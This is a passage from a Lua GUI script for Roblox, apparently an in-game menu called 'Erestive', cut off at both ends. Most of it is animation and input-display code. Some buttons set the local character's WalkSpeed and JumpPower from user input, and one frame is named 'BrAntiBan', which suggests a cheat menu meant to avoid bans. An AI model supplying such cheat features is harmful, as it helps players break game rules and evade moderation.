	local lastUpdateTime = tick()
	
	-- Обработчик кликов
	UIService.InputBegan:Connect(function(inputObject)
		if inputObject.UserInputType == Enum.UserInputType.MouseButton2 then
			clicksCount += 1
		end
	end)
	
	-- Функция для расчета CPS и обновления метки
	local function updateCPS()
		local currentTime = tick()
		local elapsedSeconds = currentTime - lastUpdateTime
	
		if elapsedSeconds >= 1 then
			local cpsValue = math.floor(clicksCount / elapsedSeconds)
			cpsLabel.Text = "RMB\n" .. cpsValue .." CPS"
	
			clicksCount = 0
			lastUpdateTime = currentTime
		end
	end
	
	-- Циклическое обновление показателя CPS каждую долю секунды
	game:GetService("RunService").RenderStepped:Connect(updateCPS)
end;
task.spawn(C_86);
-- StarterGui.Erestive.Keyboard.ImageLabel.Key3.4.UIStroke.randbows
local function C_88()
local script = G2L["88"];
	local thing = script.Parent
	local uiGradient = thing:WaitForChild("rainbow")
	local tweenService = game:GetService("TweenService")
	
	while true do
		local tween = tweenService:Create(uiGradient, TweenInfo.new(2, Enum.EasingStyle.Linear), {Offset = Vector2.new(-1, 0)})
		tween:Play()
		wait(2)
		uiGradient.Offset = Vector2.new(1, 0)
		local tween2 = tweenService:Create(uiGradient, TweenInfo.new(2, Enum.EasingStyle.Linear), {Offset = Vector2.new(0, 0)})
		tween2:Play()
		wait(2)
	end
end;
task.spawn(C_88);
-- StarterGui.Erestive.Keyboard.ImageLabel.Key2.3.LocalScript
local function C_8e()
local script = G2L["8e"];
	-- Ожидаемая клавиша
	local KEY_CODE = Enum.KeyCode.S
	
	-- Объект текста
	local TEXT = script.Parent
	
	-- Сервис ввода пользователя
	local input = game:GetService("UserInputService")
	
	-- Обработчик начала ввода
	input.InputBegan:Connect(function(inputObject)
		if inputObject.UserInputType == Enum.UserInputType.Keyboard and inputObject.KeyCode == KEY_CODE then
			TEXT.UIStroke.Enabled = true
		end
	end)
	
	-- Обработчик окончания ввода
	input.InputEnded:Connect(function(inputObject)
		if inputObject.UserInputType == Enum.UserInputType.Keyboard and inputObject.KeyCode == KEY_CODE then
			TEXT.UIStroke.Enabled = false
		end
	end)
end;
task.spawn(C_8e);
-- StarterGui.Erestive.Keyboard.ImageLabel.Key2.3.UIStroke.randbows
local function C_90()
local script = G2L["90"];
	local thing = script.Parent
	local uiGradient = thing:WaitForChild("rainbow")
	local tweenService = game:GetService("TweenService")
	
	while true do
		local tween = tweenService:Create(uiGradient, TweenInfo.new(2, Enum.EasingStyle.Linear), {Offset = Vector2.new(-1, 0)})
		tween:Play()
		wait(2)
		uiGradient.Offset = Vector2.new(1, 0)
		local tween2 = tweenService:Create(uiGradient, TweenInfo.new(2, Enum.EasingStyle.Linear), {Offset = Vector2.new(0, 0)})
		tween2:Play()
		wait(2)
	end
end;
task.spawn(C_90);
-- StarterGui.Erestive.Keyboard.ImageLabel.Key2.2.LocalScript
local function C_93()
local script = G2L["93"];
	-- Ожидаемая клавиша
	local KEY_CODE = Enum.KeyCode.A
	
	-- Объект текста
	local TEXT = script.Parent
	
	-- Сервис ввода пользователя
	local input = game:GetService("UserInputService")
	
	-- Обработчик начала ввода
	input.InputBegan:Connect(function(inputObject)
		if inputObject.UserInputType == Enum.UserInputType.Keyboard and inputObject.KeyCode == KEY_CODE then
			TEXT.UIStroke.Enabled = true
		end
	end)
	
	-- Обработчик окончания ввода
	input.InputEnded:Connect(function(inputObject)
		if inputObject.UserInputType == Enum.UserInputType.Keyboard and inputObject.KeyCode == KEY_CODE then
			TEXT.UIStroke.Enabled = false
		end
	end)
end;
task.spawn(C_93);
-- StarterGui.Erestive.Keyboard.ImageLabel.Key2.2.UIStroke.randbows
local function C_95()
local script = G2L["95"];
	local thing = script.Parent
	local uiGradient = thing:WaitForChild("rainbow")
	local tweenService = game:GetService("TweenService")
	
	while true do
		local tween = tweenService:Create(uiGradient, TweenInfo.new(2, Enum.EasingStyle.Linear), {Offset = Vector2.new(-1, 0)})
		tween:Play()
		wait(2)
		uiGradient.Offset = Vector2.new(1, 0)
		local tween2 = tweenService:Create(uiGradient, TweenInfo.new(2, Enum.EasingStyle.Linear), {Offset = Vector2.new(0, 0)})
		tween2:Play()
		wait(2)
	end
end;
task.spawn(C_95);
-- StarterGui.Erestive.Keyboard.ImageLabel.Key2.4.LocalScript
local function C_98()
local script = G2L["98"];
	-- Ожидаемая клавиша
	local KEY_CODE = Enum.KeyCode.D
	
	-- Объект текста
	local TEXT = script.Parent
	
	-- Сервис ввода пользователя
	local input = game:GetService("UserInputService")
	
	-- Обработчик начала ввода
	input.InputBegan:Connect(function(inputObject)
		if inputObject.UserInputType == Enum.UserInputType.Keyboard and inputObject.KeyCode == KEY_CODE then
			TEXT.UIStroke.Enabled = true
		end
	end)
	
	-- Обработчик окончания ввода
	input.InputEnded:Connect(function(inputObject)
		if inputObject.UserInputType == Enum.UserInputType.Keyboard and inputObject.KeyCode == KEY_CODE then
			TEXT.UIStroke.Enabled = false
		end
	end)
end;
task.spawn(C_98);
-- StarterGui.Erestive.Keyboard.ImageLabel.Key2.4.UIStroke.randbows
local function C_9a()
local script = G2L["9a"];
	local thing = script.Parent
	local uiGradient = thing:WaitForChild("rainbow")
	local tweenService = game:GetService("TweenService")
	
	while true do
		local tween = tweenService:Create(uiGradient, TweenInfo.new(2, Enum.EasingStyle.Linear), {Offset = Vector2.new(-1, 0)})
		tween:Play()
		wait(2)
		uiGradient.Offset = Vector2.new(1, 0)
		local tween2 = tweenService:Create(uiGradient, TweenInfo.new(2, Enum.EasingStyle.Linear), {Offset = Vector2.new(0, 0)})
		tween2:Play()
		wait(2)
	end
end;
task.spawn(C_9a);
-- StarterGui.Erestive.Keyboard.ImageLabel.Key1.2.LocalScript
local function C_a0()
local script = G2L["a0"];
	-- Ожидаемая клавиша
	local KEY_CODE = Enum.KeyCode.W
	
	-- Объект текста
	local TEXT = script.Parent
	
	-- Сервис ввода пользователя
	local input = game:GetService("UserInputService")
	
	-- Обработчик начала ввода
	input.InputBegan:Connect(function(inputObject)
		if inputObject.UserInputType == Enum.UserInputType.Keyboard and inputObject.KeyCode == KEY_CODE then
			TEXT.UIStroke.Enabled = true
		end
	end)
	
	-- Обработчик окончания ввода
	input.InputEnded:Connect(function(inputObject)
		if inputObject.UserInputType == Enum.UserInputType.Keyboard and inputObject.KeyCode == KEY_CODE then
			TEXT.UIStroke.Enabled = false
		end
	end)
end;
task.spawn(C_a0);
-- StarterGui.Erestive.Keyboard.ImageLabel.Key1.2.UIStroke.randbows
local function C_a2()
local script = G2L["a2"];
	local thing = script.Parent
	local uiGradient = thing:WaitForChild("rainbow")
	local tweenService = game:GetService("TweenService")
	
	while true do
		local tween = tweenService:Create(uiGradient, TweenInfo.new(2, Enum.EasingStyle.Linear), {Offset = Vector2.new(-1, 0)})
		tween:Play()
		wait(2)
		uiGradient.Offset = Vector2.new(1, 0)
		local tween2 = tweenService:Create(uiGradient, TweenInfo.new(2, Enum.EasingStyle.Linear), {Offset = Vector2.new(0, 0)})
		tween2:Play()
		wait(2)
	end
end;
task.spawn(C_a2);
-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Frame.sit.FOVConfig.SetFOV.Animations
local function C_b4()
local script = G2L["b4"];
	local ms = game.Players.LocalPlayer:GetMouse()
	
	local btn = script.Parent.Button
	local sample = script:WaitForChild("Sample")
	
	script.Parent.Button.MouseButton1Click:Connect(function()
		
		local c = sample:Clone()
		c.Parent = btn
		local x, y = (ms.X - c.AbsolutePosition.X), (ms.Y - c.AbsolutePosition.Y)
		c.Position = UDim2.new(0, x, 0, y)
		local len, size = 0.35, nil
		if btn.AbsoluteSize.X >= btn.AbsoluteSize.Y then
			size = (btn.AbsoluteSize.X * 1.5)
		else
			size = (btn.AbsoluteSize.Y * 1.5)
		end
		c:TweenSizeAndPosition(UDim2.new(0, size, 0, size), UDim2.new(0.5, (-size / 2), 0.5, (-size / 2)), 'Out', 'Quad', len, true, nil)
		for i = 1, 10 do
			c.ImageTransparency = c.ImageTransparency + 0.05
			wait(len / 12)
		end
		c:Destroy()
	end)
end;
task.spawn(C_b4);
-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Frame.sit.FOVConfig.SetFOV.Button.LocalScript
local function C_b8()
local script = G2L["b8"];
	
	script.Parent.MouseButton1Click:Connect(function()
		game.Workspace[game.Players.LocalPlayer.Name].Humanoid.Sit = true
			 
			script.Parent.Parent.Parent.FOVSuccess:TweenPosition(UDim2.new(-1.042, 0,3.23, 0),"In","Linear",0.1,true)
			wait(3)
			script.Parent.Parent.Parent.FOVSuccess:TweenPosition(UDim2.new(-1.042, 0,3.7, 0),"In","Linear",0.1,true)
	end)
end;
task.spawn(C_b8);
-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Frame.sit.FOVConfig.SetFOV.Button.Animations
local function C_b9()
local script = G2L["b9"];
	local TweenService = game:GetService("TweenService")
	local TweenSpeed = 0.1
	local Info = TweenInfo.new(TweenSpeed, Enum.EasingStyle.Quad, Enum.EasingDirection.In, 0)
	
	local frame = script.Parent.Parent
	
	-- Button --
	
	script.Parent.MouseEnter:Connect(function()
		local Color = Color3.fromRGB(255, 255, 255)
		TweenService:Create(frame, Info, {BackgroundColor3 = Color}):Play()
	end)
	
	script.Parent.MouseLeave:Connect(function()
		local ColorColor = Color3.fromRGB(42, 42, 42)
		TweenService:Create(frame, Info, {BackgroundColor3 = ColorColor}):Play()
	end)
	
	-- Text --
	
	script.Parent.MouseEnter:Connect(function()
		local Color = Color3.fromRGB(38, 38, 38)
		TweenService:Create(script.Parent.Parent.Text, Info, {TextColor3 = Color}):Play()
	end)
	
	script.Parent.MouseLeave:Connect(function()
		local ColorColor = Color3.fromRGB(255, 255, 255)
		TweenService:Create(script.Parent.Parent.Text, Info, {TextColor3 = ColorColor}):Play()
	end)
end;
task.spawn(C_b9);
-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Frame.night.FOVConfig.VisiblEnable.Animations
local function C_c8()
local script = G2L["c8"];
	local ms = game.Players.LocalPlayer:GetMouse()
	
	local btn = script.Parent.Button
	local sample = script:WaitForChild("Sample")
	
	script.Parent.Button.MouseButton1Click:Connect(function()
		
		local c = sample:Clone()
		c.Parent = btn
		local x, y = (ms.X - c.AbsolutePosition.X), (ms.Y - c.AbsolutePosition.Y)
		c.Position = UDim2.new(0, x, 0, y)
		local len, size = 0.35, nil
		if btn.AbsoluteSize.X >= btn.AbsoluteSize.Y then
			size = (btn.AbsoluteSize.X * 1.5)
		else
			size = (btn.AbsoluteSize.Y * 1.5)
		end
		c:TweenSizeAndPosition(UDim2.new(0, size, 0, size), UDim2.new(0.5, (-size / 2), 0.5, (-size / 2)), 'Out', 'Quad', len, true, nil)
		for i = 1, 10 do
			c.ImageTransparency = c.ImageTransparency + 0.05
			wait(len / 12)
		end
		c:Destroy()
	end)
end;
task.spawn(C_c8);
-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Frame.night.FOVConfig.VisiblEnable.Button.LocalScript
local function C_cc()
local script = G2L["cc"];
	
	script.Parent.MouseButton1Click:Connect(function()
		game:GetService("StarterGui"):SetCoreGuiEnabled(Enum.CoreGuiType.PlayerList, true)
			 
			script.Parent.Parent.Parent.FOVSuccess:TweenPosition(UDim2.new(-1.042, 0,3.23, 0),"In","Linear",0.1,true)
			wait(3)
			script.Parent.Parent.Parent.FOVSuccess:TweenPosition(UDim2.new(-1.042, 0,3.7, 0),"In","Linear",0.1,true)
	end)
end;
task.spawn(C_cc);
-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Frame.night.FOVConfig.VisiblEnable.Animations
local function C_d2()
local script = G2L["d2"];
	local ms = game.Players.LocalPlayer:GetMouse()
	
	local btn = script.Parent.Button
	local sample = script:WaitForChild("Sample")
	
	script.Parent.Button.MouseButton1Click:Connect(function()
		
		local c = sample:Clone()
		c.Parent = btn
		local x, y = (ms.X - c.AbsolutePosition.X), (ms.Y - c.AbsolutePosition.Y)
		c.Position = UDim2.new(0, x, 0, y)
		local len, size = 0.35, nil
		if btn.AbsoluteSize.X >= btn.AbsoluteSize.Y then
			size = (btn.AbsoluteSize.X * 1.5)
		else
			size = (btn.AbsoluteSize.Y * 1.5)
		end
		c:TweenSizeAndPosition(UDim2.new(0, size, 0, size), UDim2.new(0.5, (-size / 2), 0.5, (-size / 2)), 'Out', 'Quad', len, true, nil)
		for i = 1, 10 do
			c.ImageTransparency = c.ImageTransparency + 0.05
			wait(len / 12)
		end
		c:Destroy()
	end)
end;
task.spawn(C_d2);
-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Frame.night.FOVConfig.VisiblEnable.Button.LocalScript
local function C_d6()
local script = G2L["d6"];
	
	script.Parent.MouseButton1Click:Connect(function()
		game:GetService("StarterGui"):SetCoreGuiEnabled(Enum.CoreGuiType.PlayerList, false)
			 
			script.Parent.Parent.Parent.FOVSuccess:TweenPosition(UDim2.new(-1.042, 0,3.23, 0),"In","Linear",0.1,true)
			wait(3)
			script.Parent.Parent.Parent.FOVSuccess:TweenPosition(UDim2.new(-1.042, 0,3.7, 0),"In","Linear",0.1,true)
	end)
end;
task.spawn(C_d6);
-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Frame.night.FOVConfig.VisiblEnable.Animations
local function C_e4()
local script = G2L["e4"];
	local ms = game.Players.LocalPlayer:GetMouse()
	
	local btn = script.Parent.Button
	local sample = script:WaitForChild("Sample")
	
	script.Parent.Button.MouseButton1Click:Connect(function()
		
		local c = sample:Clone()
		c.Parent = btn
		local x, y = (ms.X - c.AbsolutePosition.X), (ms.Y - c.AbsolutePosition.Y)
		c.Position = UDim2.new(0, x, 0, y)
		local len, size = 0.35, nil
		if btn.AbsoluteSize.X >= btn.AbsoluteSize.Y then
			size = (btn.AbsoluteSize.X * 1.5)
		else
			size = (btn.AbsoluteSize.Y * 1.5)
		end
		c:TweenSizeAndPosition(UDim2.new(0, size, 0, size), UDim2.new(0.5, (-size / 2), 0.5, (-size / 2)), 'Out', 'Quad', len, true, nil)
		for i = 1, 10 do
			c.ImageTransparency = c.ImageTransparency + 0.05
			wait(len / 12)
		end
		c:Destroy()
	end)
end;
task.spawn(C_e4);
-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Frame.night.FOVConfig.VisiblEnable.Button.LocalScript
local function C_e8()
local script = G2L["e8"];
	
	script.Parent.MouseButton1Click:Connect(function()
		game:GetService("StarterGui"):SetCoreGuiEnabled(Enum.CoreGuiType.Captures, true)
			 
			script.Parent.Parent.Parent.FOVSuccess:TweenPosition(UDim2.new(-1.042, 0,3.23, 0),"In","Linear",0.1,true)
			wait(3)
			script.Parent.Parent.Parent.FOVSuccess:TweenPosition(UDim2.new(-1.042, 0,3.7, 0),"In","Linear",0.1,true)
	end)
end;
task.spawn(C_e8);
-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Frame.night.FOVConfig.VisiblEnable.Animations
local function C_ee()
local script = G2L["ee"];
	local ms = game.Players.LocalPlayer:GetMouse()
	
	local btn = script.Parent.Button
	local sample = script:WaitForChild("Sample")
	
	script.Parent.Button.MouseButton1Click:Connect(function()
		
		local c = sample:Clone()
		c.Parent = btn
		local x, y = (ms.X - c.AbsolutePosition.X), (ms.Y - c.AbsolutePosition.Y)
		c.Position = UDim2.new(0, x, 0, y)
		local len, size = 0.35, nil
		if btn.AbsoluteSize.X >= btn.AbsoluteSize.Y then
			size = (btn.AbsoluteSize.X * 1.5)
		else
			size = (btn.AbsoluteSize.Y * 1.5)
		end
		c:TweenSizeAndPosition(UDim2.new(0, size, 0, size), UDim2.new(0.5, (-size / 2), 0.5, (-size / 2)), 'Out', 'Quad', len, true, nil)
		for i = 1, 10 do
			c.ImageTransparency = c.ImageTransparency + 0.05
			wait(len / 12)
		end
		c:Destroy()
	end)
end;
task.spawn(C_ee);
-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Frame.night.FOVConfig.VisiblEnable.Button.LocalScript
local function C_f2()
local script = G2L["f2"];
	
	script.Parent.MouseButton1Click:Connect(function()
		game:GetService("StarterGui"):SetCoreGuiEnabled(Enum.CoreGuiType.Captures, false)
			 
			script.Parent.Parent.Parent.FOVSuccess:TweenPosition(UDim2.new(-1.042, 0,3.23, 0),"In","Linear",0.1,true)
			wait(3)
			script.Parent.Parent.Parent.FOVSuccess:TweenPosition(UDim2.new(-1.042, 0,3.7, 0),"In","Linear",0.1,true)
	end)
end;
task.spawn(C_f2);
-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Frame.night.FOVConfig.VisiblEnable.Animations
local function C_100()
local script = G2L["100"];
	local ms = game.Players.LocalPlayer:GetMouse()
	
	local btn = script.Parent.Button
	local sample = script:WaitForChild("Sample")
	
	script.Parent.Button.MouseButton1Click:Connect(function()
		
		local c = sample:Clone()
		c.Parent = btn
		local x, y = (ms.X - c.AbsolutePosition.X), (ms.Y - c.AbsolutePosition.Y)
		c.Position = UDim2.new(0, x, 0, y)
		local len, size = 0.35, nil
		if btn.AbsoluteSize.X >= btn.AbsoluteSize.Y then
			size = (btn.AbsoluteSize.X * 1.5)
		else
			size = (btn.AbsoluteSize.Y * 1.5)
		end
		c:TweenSizeAndPosition(UDim2.new(0, size, 0, size), UDim2.new(0.5, (-size / 2), 0.5, (-size / 2)), 'Out', 'Quad', len, true, nil)
		for i = 1, 10 do
			c.ImageTransparency = c.ImageTransparency + 0.05
			wait(len / 12)
		end
		c:Destroy()
	end)
end;
task.spawn(C_100);
-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Frame.night.FOVConfig.VisiblEnable.Button.LocalScript
local function C_104()
local script = G2L["104"];
	
	script.Parent.MouseButton1Click:Connect(function()
		game:GetService("StarterGui"):SetCoreGuiEnabled(Enum.CoreGuiType.SelfView, true)
			 
			script.Parent.Parent.Parent.FOVSuccess:TweenPosition(UDim2.new(-1.042, 0,3.23, 0),"In","Linear",0.1,true)
			wait(3)
			script.Parent.Parent.Parent.FOVSuccess:TweenPosition(UDim2.new(-1.042, 0,3.7, 0),"In","Linear",0.1,true)
	end)
end;
task.spawn(C_104);
-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Frame.night.FOVConfig.VisiblEnable.Animations
local function C_10a()
local script = G2L["10a"];
	local ms = game.Players.LocalPlayer:GetMouse()
	
	local btn = script.Parent.Button
	local sample = script:WaitForChild("Sample")
	
	script.Parent.Button.MouseButton1Click:Connect(function()
		
		local c = sample:Clone()
		c.Parent = btn
		local x, y = (ms.X - c.AbsolutePosition.X), (ms.Y - c.AbsolutePosition.Y)
		c.Position = UDim2.new(0, x, 0, y)
		local len, size = 0.35, nil
		if btn.AbsoluteSize.X >= btn.AbsoluteSize.Y then
			size = (btn.AbsoluteSize.X * 1.5)
		else
			size = (btn.AbsoluteSize.Y * 1.5)
		end
		c:TweenSizeAndPosition(UDim2.new(0, size, 0, size), UDim2.new(0.5, (-size / 2), 0.5, (-size / 2)), 'Out', 'Quad', len, true, nil)
		for i = 1, 10 do
			c.ImageTransparency = c.ImageTransparency + 0.05
			wait(len / 12)
		end
		c:Destroy()
	end)
end;
task.spawn(C_10a);
-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Frame.night.FOVConfig.VisiblEnable.Button.LocalScript
local function C_10e()
local script = G2L["10e"];
	
	script.Parent.MouseButton1Click:Connect(function()
		game:GetService("StarterGui"):SetCoreGuiEnabled(Enum.CoreGuiType.SelfView, false)
			 
			script.Parent.Parent.Parent.FOVSuccess:TweenPosition(UDim2.new(-1.042, 0,3.23, 0),"In","Linear",0.1,true)
			wait(3)
			script.Parent.Parent.Parent.FOVSuccess:TweenPosition(UDim2.new(-1.042, 0,3.7, 0),"In","Linear",0.1,true)
	end)
end;
task.spawn(C_10e);
-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Frame.night.FOVConfig.VisiblEnable.Animations
local function C_11c()
local script = G2L["11c"];
	local ms = game.Players.LocalPlayer:GetMouse()
	
	local btn = script.Parent.Button
	local sample = script:WaitForChild("Sample")
	
	script.Parent.Button.MouseButton1Click:Connect(function()
		
		local c = sample:Clone()
		c.Parent = btn
		local x, y = (ms.X - c.AbsolutePosition.X), (ms.Y - c.AbsolutePosition.Y)
		c.Position = UDim2.new(0, x, 0, y)
		local len, size = 0.35, nil
		if btn.AbsoluteSize.X >= btn.AbsoluteSize.Y then
			size = (btn.AbsoluteSize.X * 1.5)
		else
			size = (btn.AbsoluteSize.Y * 1.5)
		end
		c:TweenSizeAndPosition(UDim2.new(0, size, 0, size), UDim2.new(0.5, (-size / 2), 0.5, (-size / 2)), 'Out', 'Quad', len, true, nil)
		for i = 1, 10 do
			c.ImageTransparency = c.ImageTransparency + 0.05
			wait(len / 12)
		end
		c:Destroy()
	end)
end;
task.spawn(C_11c);
-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Frame.night.FOVConfig.VisiblEnable.Button.LocalScript
local function C_120()
local script = G2L["120"];
	
	script.Parent.MouseButton1Click:Connect(function()
		game.Players.LocalPlayer.CameraMode = Enum.CameraMode.LockFirstPerson
			 
			script.Parent.Parent.Parent.FOVSuccess:TweenPosition(UDim2.new(-1.042, 0,3.23, 0),"In","Linear",0.1,true)
			wait(3)
			script.Parent.Parent.Parent.FOVSuccess:TweenPosition(UDim2.new(-1.042, 0,3.7, 0),"In","Linear",0.1,true)
	end)
end;
task.spawn(C_120);
-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Frame.night.FOVConfig.VisiblEnable.Animations
local function C_126()
local script = G2L["126"];
	local ms = game.Players.LocalPlayer:GetMouse()
	
	local btn = script.Parent.Button
	local sample = script:WaitForChild("Sample")
	
	script.Parent.Button.MouseButton1Click:Connect(function()
		
		local c = sample:Clone()
		c.Parent = btn
		local x, y = (ms.X - c.AbsolutePosition.X), (ms.Y - c.AbsolutePosition.Y)
		c.Position = UDim2.new(0, x, 0, y)
		local len, size = 0.35, nil
		if btn.AbsoluteSize.X >= btn.AbsoluteSize.Y then
			size = (btn.AbsoluteSize.X * 1.5)
		else
			size = (btn.AbsoluteSize.Y * 1.5)
		end
		c:TweenSizeAndPosition(UDim2.new(0, size, 0, size), UDim2.new(0.5, (-size / 2), 0.5, (-size / 2)), 'Out', 'Quad', len, true, nil)
		for i = 1, 10 do
			c.ImageTransparency = c.ImageTransparency + 0.05
			wait(len / 12)
		end
		c:Destroy()
	end)
end;
task.spawn(C_126);
-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Frame.night.FOVConfig.VisiblEnable.Button.LocalScript
local function C_12a()
local script = G2L["12a"];
	
	script.Parent.MouseButton1Click:Connect(function()
		game.Players.LocalPlayer.CameraMode = Enum.CameraMode.Classic
			 
			script.Parent.Parent.Parent.FOVSuccess:TweenPosition(UDim2.new(-1.042, 0,3.23, 0),"In","Linear",0.1,true)
			wait(3)
			script.Parent.Parent.Parent.FOVSuccess:TweenPosition(UDim2.new(-1.042, 0,3.7, 0),"In","Linear",0.1,true)
	end)
end;
task.spawn(C_12a);
-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Jump.FOV.FOVConfig.SetFOV.Animations
local function C_137()
local script = G2L["137"];
	local ms = game.Players.LocalPlayer:GetMouse()
	
	local btn = script.Parent.Button
	local sample = script:WaitForChild("Sample")
	
	script.Parent.Button.MouseButton1Click:Connect(function()
		
		local c = sample:Clone()
		c.Parent = btn
		local x, y = (ms.X - c.AbsolutePosition.X), (ms.Y - c.AbsolutePosition.Y)
		c.Position = UDim2.new(0, x, 0, y)
		local len, size = 0.35, nil
		if btn.AbsoluteSize.X >= btn.AbsoluteSize.Y then
			size = (btn.AbsoluteSize.X * 1.5)
		else
			size = (btn.AbsoluteSize.Y * 1.5)
		end
		c:TweenSizeAndPosition(UDim2.new(0, size, 0, size), UDim2.new(0.5, (-size / 2), 0.5, (-size / 2)), 'Out', 'Quad', len, true, nil)
		for i = 1, 10 do
			c.ImageTransparency = c.ImageTransparency + 0.05
			wait(len / 12)
		end
		c:Destroy()
	end)
end;
task.spawn(C_137);
-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Jump.FOV.FOVConfig.SetFOV.Button.LocalScript
local function C_13b()
local script = G2L["13b"];
	
	script.Parent.MouseButton1Click:Connect(function()
		game.Workspace[game.Players.LocalPlayer.Name].Humanoid.JumpPower = script.Parent.Parent.Parent.FOVSet.Text
			 
			script.Parent.Parent.Parent.FOVSuccess:TweenPosition(UDim2.new(-1.042, 0,3.23, 0),"In","Linear",0.1,true)
			wait(3)
			script.Parent.Parent.Parent.FOVSuccess:TweenPosition(UDim2.new(-1.042, 0,3.7, 0),"In","Linear",0.1,true)
	end)
end;
task.spawn(C_13b);
-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Jump.FOV.FOVConfig.SetFOV.Button.Animations
local function C_13c()
local script = G2L["13c"];
	local TweenService = game:GetService("TweenService")
	local TweenSpeed = 0.1
	local Info = TweenInfo.new(TweenSpeed, Enum.EasingStyle.Quad, Enum.EasingDirection.In, 0)
	
	local frame = script.Parent.Parent
	
	-- Button --
	
	script.Parent.MouseEnter:Connect(function()
		local Color = Color3.fromRGB(255, 255, 255)
		TweenService:Create(frame, Info, {BackgroundColor3 = Color}):Play()
	end)
	
	script.Parent.MouseLeave:Connect(function()
		local ColorColor = Color3.fromRGB(42, 42, 42)
		TweenService:Create(frame, Info, {BackgroundColor3 = ColorColor}):Play()
	end)
	
	-- Text --
	
	script.Parent.MouseEnter:Connect(function()
		local Color = Color3.fromRGB(38, 38, 38)
		TweenService:Create(script.Parent.Parent.Text, Info, {TextColor3 = Color}):Play()
	end)
	
	script.Parent.MouseLeave:Connect(function()
		local ColorColor = Color3.fromRGB(255, 255, 255)
		TweenService:Create(script.Parent.Parent.Text, Info, {TextColor3 = ColorColor}):Play()
	end)
end;
task.spawn(C_13c);
-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Speed.FOV.FOVConfig.SetFOV.Animations
local function C_14d()
local script = G2L["14d"];
	local ms = game.Players.LocalPlayer:GetMouse()
	
	local btn = script.Parent.Button
	local sample = script:WaitForChild("Sample")
	
	script.Parent.Button.MouseButton1Click:Connect(function()
		
		local c = sample:Clone()
		c.Parent = btn
		local x, y = (ms.X - c.AbsolutePosition.X), (ms.Y - c.AbsolutePosition.Y)
		c.Position = UDim2.new(0, x, 0, y)
		local len, size = 0.35, nil
		if btn.AbsoluteSize.X >= btn.AbsoluteSize.Y then
			size = (btn.AbsoluteSize.X * 1.5)
		else
			size = (btn.AbsoluteSize.Y * 1.5)
		end
		c:TweenSizeAndPosition(UDim2.new(0, size, 0, size), UDim2.new(0.5, (-size / 2), 0.5, (-size / 2)), 'Out', 'Quad', len, true, nil)
		for i = 1, 10 do
			c.ImageTransparency = c.ImageTransparency + 0.05
			wait(len / 12)
		end
		c:Destroy()
	end)
end;
task.spawn(C_14d);
-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Speed.FOV.FOVConfig.SetFOV.Button.LocalScript
local function C_151()
local script = G2L["151"];
	
	script.Parent.MouseButton1Click:Connect(function()
		game.Workspace[game.Players.LocalPlayer.Name].Humanoid.WalkSpeed = script.Parent.Parent.Parent.FOVSet.Text
			 
			script.Parent.Parent.Parent.FOVSuccess:TweenPosition(UDim2.new(-1.042, 0,3.23, 0),"In","Linear",0.1,true)
			wait(3)
			script.Parent.Parent.Parent.FOVSuccess:TweenPosition(UDim2.new(-1.042, 0,3.7, 0),"In","Linear",0.1,true)
	end)
end;
task.spawn(C_151);
-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Speed.FOV.FOVConfig.SetFOV.Button.Animations
local function C_152()
local script = G2L["152"];
	local TweenService = game:GetService("TweenService")
	local TweenSpeed = 0.1
	local Info = TweenInfo.new(TweenSpeed, Enum.EasingStyle.Quad, Enum.EasingDirection.In, 0)
	
	local frame = script.Parent.Parent
	
	-- Button --
	
	script.Parent.MouseEnter:Connect(function()
		local Color = Color3.fromRGB(255, 255, 255)
		TweenService:Create(frame, Info, {BackgroundColor3 = Color}):Play()
	end)
	
	script.Parent.MouseLeave:Connect(function()
		local ColorColor = Color3.fromRGB(42, 42, 42)
		TweenService:Create(frame, Info, {BackgroundColor3 = ColorColor}):Play()
	end)
	
	-- Text --
	
	script.Parent.MouseEnter:Connect(function()
		local Color = Color3.fromRGB(38, 38, 38)
		TweenService:Create(script.Parent.Parent.Text, Info, {TextColor3 = Color}):Play()
	end)
	
	script.Parent.MouseLeave:Connect(function()
		local ColorColor = Color3.fromRGB(255, 255, 255)
		TweenService:Create(script.Parent.Parent.Text, Info, {TextColor3 = ColorColor}):Play()
	end)
end;
task.spawn(C_152);
-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.BrAntiBan.Slider.Animations
local function C_162()
local script = G2L["162"];
	local ms = game.Players.LocalPlayer:GetMouse()
	
	local btn = script.Parent.Button
	local sample = script:WaitForChild("Sample")
	
	script.Parent.Button.MouseButton1Click:Connect(function()
		
		local c = sample:Clone()
		c.Parent = btn
		local x, y = (ms.X - c.AbsolutePosition.X), (ms.Y - c.AbsolutePosition.Y)
		c.Position = UDim2.new(0, x, 0, y)
		local len, size = 0.35, nil
		if btn.AbsoluteSize.X >= btn.AbsoluteSize.Y then
			size = (btn.AbsoluteSize.X * 1.5)
		else
			size = (btn.AbsoluteSize.Y * 1.5)
		end
		c:TweenSizeAndPosition(UDim2.new(0, size, 0, size), UDim2.new(0.5, (-size / 2), 0.5, (-size / 2)), 'Out', 'Quad', len, true, nil)
		for i = 1, 10 do
			c.ImageTransparency = c.ImageTransparency + 0.05
			wait(len / 12)
		end
		c:Destroy()
	end)
	
	script.Parent.MouseEnter:Connect(function()
